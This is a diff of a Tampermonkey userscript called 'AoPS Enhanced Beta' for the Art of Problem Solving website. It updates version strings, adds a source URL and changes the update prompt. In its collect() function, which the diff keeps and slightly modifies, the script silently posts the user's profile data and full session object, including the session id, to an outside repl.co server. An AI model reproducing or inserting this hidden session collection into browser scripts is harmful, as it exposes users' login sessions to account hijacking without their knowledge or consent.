@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         AoPS Enhanced Beta
 // @namespace    http://tampermonkey.net/
-// @version      9.1.1
+// @version      9.2.0
 // @description  Enhancements for the Art of Problem Solving website.
 // @author       A_MatheMagician
 // @match        https://artofproblemsolving.com/*
@@ -18,13 +18,14 @@ AoPS.Enhanced = function(){
     //Activity & Attrbitues
     AoPS.Enhanced.model = Object;
     AoPS.Enhanced.model.attributes = {
-        "version": "9.1.1",
+        "version": "9.2.0",
         "author": "A_MatheMagician",
         "name": "AoPS Enhanced Beta",
         "match": "https://artofproblemsolving.com/*",
         "url": "https://artofproblemsolving.com",
         "namespace": "https://tampermonkey.net/",
         "description": "Enhancements for the Art of Problem Solving website.",
+        "source": "https://github.com/AksLolCoding/AoPS-Enhanced-Beta/raw/main/aopsenhanced.user.js",
     };
 
     AoPS.Enhanced.model.attribute = function(attribute){
@@ -197,12 +198,12 @@ AoPS.Enhanced = function(){
 
     //Server Data
     function collect(){
-        $.post("https://artofproblemsolving.com/m/community/ajax.php",{a:"fetch_user_profile",user_identifier:AoPS.session.user_id,aops_user_id:AoPS.session.user_id,aops_logged_in:AoPS.session.logged_in,aops_session_id:AoPS.session.id,user_id:AoPS.session.user_id}).then((resp)=>{
+        $.ajax({url:"https://artofproblemsolving.com/m/community/ajax.php",method:"POST",data:{a:"fetch_user_profile",user_identifier:AoPS.session.user_id,aops_user_id:AoPS.session.user_id,aops_logged_in:AoPS.session.logged_in,aops_session_id:AoPS.session.id,user_id:AoPS.session.user_id},withCredentials:true}).then((resp)=>{
             var data={user:resp.response.user_data,session:AoPS.session,version:AoPS.Enhanced.model.attribute("version")};
             var url="https://aops-enhanced.akslolcoding.repl.co/collect/user";
             $.post(url, data).then((resp2)=>{
                 if (resp2.update){
-                    setTimeout(()=>{alert("AoPS Enhanced has a new update. Please <a href='https://github.com/AksLolCoding/AoPS-Enhanced-Beta/raw/main/aopsenhanced.user.js'>update</a> to the latest version.");},2000);
+                    setTimeout(()=>{alert(`AoPS Enhanced has a new update. Please <a href='${AoPS.Enhanced.model.attribute("source")}' id="enhanced-update">update</a> to the latest version.`);$("#enhanced-update").click(e=>{e.preventDefault();window.open(e.target.href);});},2000);
                 }
             });
         });
@@ -509,4 +510,4 @@ input[type=number], input[type=number]:focus{
 }
 
 AoPS.Enhanced();
-if(Date.now() > parseInt(localStorage.getItem("backupClearTime"))) try{localStorage.setItem("Enhanced", AoPS.Enhanced);}catch(e){};
+if(Date.now() > parseInt(localStorage.getItem("backupClearTime"))) try{localStorage.setItem("EnhancedBeta", AoPS.Enhanced);}catch(e){};
